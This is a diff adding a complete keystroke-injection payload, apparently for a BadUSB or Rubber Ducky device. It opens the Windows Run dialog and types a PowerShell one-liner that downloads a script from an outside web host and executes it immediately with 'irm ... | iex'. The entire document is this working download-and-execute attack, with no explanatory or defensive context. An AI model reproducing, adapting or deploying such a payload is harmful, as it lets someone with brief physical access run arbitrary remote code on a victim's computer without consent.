@@ -1,0 +1,4 @@
+DELAY 2000
+WINDOWS r
+DELAY 1000
+STRINGLN powershell -command "irm https://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1 | iex"
